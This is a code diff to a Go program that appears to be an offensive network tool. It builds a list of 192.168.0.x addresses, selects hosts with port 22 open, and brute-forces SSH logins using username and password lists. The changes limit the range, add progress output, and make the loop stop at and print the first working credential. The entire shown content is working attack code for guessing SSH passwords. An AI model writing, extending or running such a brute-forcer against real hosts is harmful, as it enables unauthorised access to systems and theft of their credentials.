@@ -30,9 +30,13 @@ type credentials struct {
 
 // Run is
 func (a *Attack) Run() {
+	if a.wg == nil {
+		a.wg = new(sync.WaitGroup)
+	}
+
 	var hs []string
 
-	for i := 0; i < 255; i++ {
+	for i := 0; i < 7; i++ {
 		hs = append(hs, fmt.Sprintf("192.168.0.%d", i))
 	}
 
@@ -42,6 +46,7 @@ func (a *Attack) Run() {
 	for _, host := range hosts {
 		port := strings.Split(host, ":")[1]
 		if port == "22" {
+			fmt.Println("[*] starting brute force for", host)
 			a.wg.Add(1)
 			go a.bruteForce(host)
 		}
@@ -54,8 +59,6 @@ func (a *Attack) Run() {
 func (a *Attack) bruteForce(host string) {
 	defer a.wg.Done()
 
-	var creds []credentials
-
 	usernames, err := getContent(a.UsernameFile)
 	if err != nil {
 		fmt.Println(err)
@@ -66,30 +69,36 @@ func (a *Attack) bruteForce(host string) {
 		fmt.Println(err)
 		return
 	}
-
+	var found = false
+	c := new(credentials)
 	for _, u := range usernames {
+		found = false
 		for _, p := range passwords {
-			ok, err := a.login(host, u, p)
-			if err != nil {
+			if err := a.login(host, u, p); err != nil {
 				continue
 			}
-
-			if ok {
-				c := credentials{
-					username: u,
-					password: p,
-					host:     host,
-					port:     "22",
-				}
-
-				creds = append(creds, c)
+			c = &credentials{
+				username: u,
+				password: p,
+				host:     host,
 			}
+
+			found = true
+
+			break
+
+		}
+
+		if found {
+			break
 		}
 	}
+
+	fmt.Println(c)
 }
 
 // Login is
-func (a *Attack) login(host, username, password string) (bool, error) {
+func (a *Attack) login(host, username, password string) error {
 	config := &ssh.ClientConfig{
 		User: username,
 		Auth: []ssh.AuthMethod{
@@ -99,10 +108,10 @@ func (a *Attack) login(host, username, password string) (bool, error) {
 
 	_, err := ssh.Dial("tcp", host, config)
 	if err != nil {
-		return false, err
+		return err
 	}
 
-	return true, nil
+	return nil
 }
 
 func getContent(file string) ([]string, error) {
